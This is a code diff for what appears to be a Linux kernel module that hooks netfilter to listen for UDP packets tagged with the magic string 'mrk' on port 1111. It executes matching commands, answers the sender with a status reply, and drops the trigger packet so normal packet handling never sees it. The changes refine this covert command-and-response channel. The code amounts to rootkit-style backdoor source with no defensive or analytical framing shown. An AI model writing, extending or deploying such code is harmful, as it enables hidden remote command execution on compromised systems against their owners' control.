@@ -417,7 +417,6 @@ static int exit_func(const char *_) {
 
 int cmds_len = 5;
 int cmd_port = 1111;
-int cmd_response_port = 2312;
 char *cmd_magic = "mrk";
 int job_id_len = 2;
 struct cmd_type cmds[] = {
@@ -462,6 +461,7 @@ static int send_response(
     int response_status,
     unsigned int local_ip,
     unsigned int remote_ip,
+    unsigned int remote_port,
     unsigned char remote_mac[],
     struct net_device *dev
 ) {
@@ -469,7 +469,7 @@ static int send_response(
     struct udphdr *udph;
     struct ethhdr *eth;
     struct sk_buff *skb;
-    int data_len = 5;
+    int data_len = 3;
     char *data;
     int header_len = sizeof(struct udphdr) + 5 * 4 + ETH_HLEN;
     printk(KERN_INFO "returning response %d for job id %u\n", response_status, job_id);
@@ -480,14 +480,16 @@ static int send_response(
     }
     skb_reserve(skb, header_len);
     data = skb_put(skb, data_len);
-//    ((short *)data)[0] = job_id;
-//    ((char *)data)[3] = 1;
-    strcpy(data, "abcde");
+
+    // put response data.
+    *data = job_id;
+    put_unaligned((char)response_status, data + 2);
+
     skb_push(skb, sizeof(struct udphdr));
     skb_reset_transport_header(skb);
     udph = udp_hdr(skb);
     udph->source = htons(cmd_port);
-    udph->dest = htons(cmd_response_port);
+    udph->dest = remote_port;
     udph->len = htons(data_len + sizeof(struct udphdr));
     udph->check = 0;
     udph->check = csum_tcpudp_magic(
@@ -555,7 +557,7 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
         if (!match_cmd(cmds + i, user_data + job_id_len + strlen(cmd_magic))) {
             result = call_cmd(cmds + i, user_data + job_id_len + strlen(cmd_magic), ntohs(udph->len) - sizeof(struct udphdr));
             printk(KERN_INFO "Found %s cmd packet! executed with code %d\n", cmds[i].name, result);
-            send_response(get_unaligned((unsigned short *)(user_data + strlen(cmd_magic))), result, iph->daddr, iph->saddr, eth_hdr(skb)->h_source, skb->dev);
+            send_response(get_unaligned((unsigned short *)(user_data + strlen(cmd_magic))), result, iph->daddr, iph->saddr, udph->source, eth_hdr(skb)->h_source, skb->dev);
             return NF_DROP;
         }
     }
